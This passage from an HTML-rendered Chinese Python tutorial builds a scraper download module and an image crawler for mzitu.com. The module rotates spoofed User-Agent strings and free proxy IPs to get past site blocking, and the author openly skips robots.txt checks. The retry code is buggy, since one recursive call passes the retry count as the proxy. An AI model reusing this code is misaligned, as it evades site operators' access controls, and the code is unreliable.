Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">get</span>(self, url, timeout, <span class="attribute">proxy</span>=None, <span class="attribute">num_retries</span>=6): ##给函数一个默认参数proxy为空</span><br><span class="line">        UA = random.choice(self.user_agent_list) ##从self.user_agent_list中随机取出一个字符串</span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  ##构造成一个完整的User-Agent （UA代表的是上面随机取出来的字符串哦）</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span><span class="built_in"> proxy </span>== None: ##当代理为空时，不使用代理获取response（别忘了response啥哦！之前说过了！！）</span><br><span class="line">            try:</span><br><span class="line">                return requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=timeout)##这样服务器就会以为我们是真的浏览器了</span><br><span class="line">            except:##如过上面的代码执行报错则执行下面的代码</span><br><span class="line">                <span class="keyword">if</span> num_retries &gt; 0: ##num_retries是我们限定的重试次数</span><br><span class="line">                    time.sleep(10) ##延迟十秒</span><br><span class="line">                    <span class="builtin-name">print</span>(u<span class="string">'获取网页出错，10S后将获取倒数第：'</span>, num_retries, u<span class="string">'次'</span>)</span><br><span class="line">                    return self.<span class="builtin-name">get</span>(url, timeout, num_retries-1)  ##调用自身 并将次数减1</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="builtin-name">print</span>(u<span class="string">'开始使用代理'</span>)</span><br><span class="line">                    time.sleep(10)</span><br><span class="line">                   <span class="built_in"> IP </span>= <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) ##下面有解释哦</span><br><span class="line">                   <span class="built_in"> proxy </span>= &#123;<span class="string">'http'</span>: IP&#125;</span><br><span class="line">                    return self.<span class="builtin-name">get</span>(url, timeout, proxy,) ##代理不为空的时候</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: ##当代理不为空</span><br><span class="line">           <span class="built_in"> IP </span>= <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) ##将从self.iplist中获取的字符串处理成我们需要的格式（处理了些什么自己看哦，这是基础呢）</span><br><span class="line">           <span class="built_in"> proxy </span>= &#123;<span class="string">'http'</span>: IP&#125; ##构造成一个代理</span><br><span class="line">            return requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">proxies</span>=proxy, timeout = timeout) ##使用代理获取response</span><br><span class="line">Xz = download() ##实例化</span><br><span class="line"><span class="builtin-name">print</span>(Xz.<span class="builtin-name">get</span>(<span class="string">"mzitu.com"</span>, 3)) ##打印headers</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>上面代码添加了一个 timeout （防止超时）、一个 num_retries=6（限制次数，6 次过后使用代理）。 下面我们让使用代理失败 6 次后，取消代理，直接上代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">download</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.iplist = []  <span class="comment">##初始化一个list用来存放我们获取到的IP</span></span><br><span class="line">        html = requests.get(<span class="string">"http://haoip.cc/tiqu.htm"</span>)  <span class="comment">##不解释咯</span></span><br><span class="line">        iplistn = re.findall(<span class="string">r'r/&gt;(.*?)&lt;b'</span>, html.text, re.S)  <span class="comment">##表示从html.text中获取所有r/&gt;&lt;b中的内容，re.S的意思是包括匹配包括换行符，findall返回的是个list哦！</span></span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> iplistn:</span><br><span class="line">            i = re.sub(<span class="string">'\n'</span>, <span class="string">''</span>, ip)  <span class="comment">##re.sub 是re模块替换的方法，这儿表示将\n替换为空</span></span><br><span class="line">            self.iplist.append(i.strip())  <span class="comment">##添加到我们上面初始化的list里面</span></span><br><span class="line"></span><br><span class="line">        self.user_agent_list = [</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, url, timeout, proxy=None, num_retries=<span class="number">6</span>)</span>:</span> <span class="comment">##给函数一个默认参数proxy为空</span></span><br><span class="line">        print(<span class="string">u'开始获取：'</span>, url)</span><br><span class="line">        UA = random.choice(self.user_agent_list) <span class="comment">##从self.user_agent_list中随机取出一个字符串</span></span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  <span class="comment">##构造成一个完整的User-Agent （UA代表的是上面随机取出来的字符串哦）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> proxy == <span class="literal">None</span>: <span class="comment">##当代理为空时，不使用代理获取response（别忘了response啥哦！之前说过了！！）</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> requests.get(url, headers=headers, timeout=timeout)<span class="comment">##这样服务器就会以为我们是真的浏览器了</span></span><br><span class="line">            <span class="keyword">except</span>:<span class="comment">##如过上面的代码执行报错则执行下面的代码</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> num_retries &gt; <span class="number">0</span>: <span class="comment">##num_retries是我们限定的重试次数</span></span><br><span class="line">                    time.sleep(<span class="number">10</span>) <span class="comment">##延迟十秒</span></span><br><span class="line">                    print(<span class="string">u'获取网页出错，10S后将获取倒数第：'</span>, num_retries, <span class="string">u'次'</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, num_retries<span class="number">-1</span>)  <span class="comment">##调用自身 并将次数减1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u'开始使用代理'</span>)</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) <span class="comment">##下面有解释哦</span></span><br><span class="line">                    proxy = &#123;<span class="string">'http'</span>: IP&#125;</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, proxy,) <span class="comment">##代理不为空的时候</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment">##当代理不为空</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) <span class="comment">##将从self.iplist中获取的字符串处理成我们需要的格式（处理了些什么自己看哦，这是基础呢）</span></span><br><span class="line">                proxy = &#123;<span class="string">'http'</span>: IP&#125; <span class="comment">##构造成一个代理</span></span><br><span class="line">                <span class="keyword">return</span> requests.get(url, headers=headers, proxies=proxy, timeout=timeout) <span class="comment">##使用代理获取response</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> num_retries &gt; <span class="number">0</span>:</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip())</span><br><span class="line">                    proxy = &#123;<span class="string">'http'</span>: IP&#125;</span><br><span class="line">                    print(<span class="string">u'正在更换代理，10S后将重新获取倒数第'</span>, num_retries, <span class="string">u'次'</span>)</span><br><span class="line">                    print(<span class="string">u'当前代理是：'</span>, proxy)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, proxy, num_retries - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u'代理也不好使了！取消代理'</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, <span class="number">3</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" alt="QQ图片20161021224219"></a> 收工一个较为健壮的下载模块搞定（当然一个健壮的模块还应该有其它的内容，比如判断地址是否是 robots.txt 文件禁止获取的；错误状态判断是否是服务器出错，限制爬虫深度防止掉入爬虫陷进之类的····） 不过我怕太多大家消化不了，而且我们一般遇到的网站基本不会碰到爬虫陷阱（有也不怕啊，反正规模不大，自己也就注意到了。） 下面我们来把这个下载模块使用到我们上一篇博文的爬出红里面去！ 用法很简单！ヾ(<em>´▽‘</em>)ﾉ将这个 py 文件放在和上一篇博文爬虫相同的文件夹里面；并新建一个<strong>init</strong>.py 的文件。像这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161030144544-e1477920240854.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161030144544-e1477920240854.png" alt=""></a> 在爬虫里面导入下载模块即可，class 继承一下下载模块；然后替换掉上一篇爬虫里面的全部 requests.get，为 download.get 即可！还必须加上 timeout 参数哦！废话不多说直接上代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Download <span class="keyword">import</span> download</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mzitu</span><span class="params">(download)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        html = download.get(self, url, <span class="number">3</span>) <span class="comment">##这儿替换了，并加上timeout参数</span></span><br><span class="line">        all_a = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">            title = a.get_text()</span><br><span class="line">            print(<span class="string">u'开始保存：'</span>, title)</span><br><span class="line">            path = str(title).replace(<span class="string">"?"</span>, <span class="string">'_'</span>)</span><br><span class="line">            self.mkdir(path)</span><br><span class="line">            os.chdir(<span class="string">"D:\mzitu\\"</span>+path)</span><br><span class="line">            href = a[<span class="string">'href'</span>]</span><br><span class="line">            self.html(href)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(self, href)</span>:</span></span><br><span class="line">        html = download.get(self, href, <span class="number">3</span>)</span><br><span class="line">        max_span = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find_all(<span class="string">'span'</span>)[<span class="number">10</span>].get_text()</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span) + <span class="number">1</span>):</span><br><span class="line">            page_url = href + <span class="string">'/'</span> + str(page)</span><br><span class="line">            self.img(page_url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">(self, page_url)</span>:</span></span><br><span class="line">        img_html = download.get(self, page_url, <span class="number">3</span>) <span class="comment">##这儿替换了</span></span><br><span class="line">        img_url = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        self.save(img_url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, img_url)</span>:</span></span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>]</span><br><span class="line">        print(<span class="string">u'开始保存：'</span>, img_url)</span><br><span class="line">        img = download.get(self, img_url, <span class="number">3</span>) <span class="comment">##这儿替换了，并加上timeout参数</span></span><br><span class="line">        f = open(name + <span class="string">'.jpg'</span>, <span class="string">'ab'</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(self, path)</span>:</span> <span class="comment">##这个函数创建文件夹</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Mzitu = mzitu() <span class="comment">##实例化</span></span><br><span class="line">Mzitu.all_url(<span class="string">'http://www.mzitu.com/all'</span>) <span class="comment">##给函数all_url传入参数  你可以当作启动爬虫（就是入口）</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好了！搞完收工！大家可以看一下和上一次我们写的爬虫有哪些变化就知道我们做了什么啦！ <strong>2016/11/4 更新：</strong>今天做教程的时候发现我忽略了一个问题，上面的写法，属于子类继承父类，这种写法 子类没法用<strong>init</strong>;所以我改了一下写法，（其余都没变，不用担心。）直接贴代码了： 首先是下载模块（Download.py）:</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">download</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.iplist = []  <span class="comment">##初始化一个list用来存放我们获取到的IP</span></span><br><span class="line">        html = requests.get(<span class="string">"http://haoip.cc/tiqu.htm"</span>)  <span class="comment">##不解释咯</span></span><br><span class="line">        iplistn = re.findall(<span class="string">r'r/&gt;(.*?)&lt;b'</span>, html.text, re.S)  <span class="comment">##表示从html.text中获取所有r/&gt;&lt;b中的内容，re.S的意思是包括匹配包括换行符，findall返回的是个list哦！</span></span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> iplistn:</span><br><span class="line">            i = re.sub(<span class="string">'\n'</span>, <span class="string">''</span>, ip)  <span class="comment">##re.sub 是re模块替换的方法，这儿表示将\n替换为空</span></span><br><span class="line">            self.iplist.append(i.strip())  <span class="comment">##添加到我们上面初始化的list里面</span></span><br><span class="line"></span><br><span class="line">        self.user_agent_list = [</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">            <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, url, timeout, proxy=None, num_retries=<span class="number">6</span>)</span>:</span> <span class="comment">##给函数一个默认参数proxy为空</span></span><br><span class="line">        UA = random.choice(self.user_agent_list) <span class="comment">##从self.user_agent_list中随机取出一个字符串</span></span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: UA&#125;  <span class="comment">##构造成一个完整的User-Agent （UA代表的是上面随机取出来的字符串哦）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> proxy == <span class="literal">None</span>: <span class="comment">##当代理为空时，不使用代理获取response（别忘了response啥哦！之前说过了！！）</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> requests.get(url, headers=headers, timeout=timeout)<span class="comment">##这样服务器就会以为我们是真的浏览器了</span></span><br><span class="line">            <span class="keyword">except</span>:<span class="comment">##如过上面的代码执行报错则执行下面的代码</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> num_retries &gt; <span class="number">0</span>: <span class="comment">##num_retries是我们限定的重试次数</span></span><br><span class="line">                    time.sleep(<span class="number">10</span>) <span class="comment">##延迟十秒</span></span><br><span class="line">                    print(<span class="string">u'获取网页出错，10S后将获取倒数第：'</span>, num_retries, <span class="string">u'次'</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, num_retries<span class="number">-1</span>)  <span class="comment">##调用自身 并将次数减1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u'开始使用代理'</span>)</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) <span class="comment">##下面有解释哦</span></span><br><span class="line">                    proxy = &#123;<span class="string">'http'</span>: IP&#125;</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, proxy,) <span class="comment">##代理不为空的时候</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment">##当代理不为空</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip()) <span class="comment">##将从self.iplist中获取的字符串处理成我们需要的格式（处理了些什么自己看哦，这是基础呢）</span></span><br><span class="line">                proxy = &#123;<span class="string">'http'</span>: IP&#125; <span class="comment">##构造成一个代理</span></span><br><span class="line">                <span class="keyword">return</span> requests.get(url, headers=headers, proxies=proxy, timeout=timeout) <span class="comment">##使用代理获取response</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> num_retries &gt; <span class="number">0</span>:</span><br><span class="line">                    time.sleep(<span class="number">10</span>)</span><br><span class="line">                    IP = <span class="string">''</span>.join(str(random.choice(self.iplist)).strip())</span><br><span class="line">                    proxy = &#123;<span class="string">'http'</span>: IP&#125;</span><br><span class="line">                    print(<span class="string">u'正在更换代理，10S后将重新获取倒数第'</span>, num_retries, <span class="string">u'次'</span>)</span><br><span class="line">                    print(<span class="string">u'当前代理是：'</span>, proxy)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, timeout, proxy, num_retries - <span 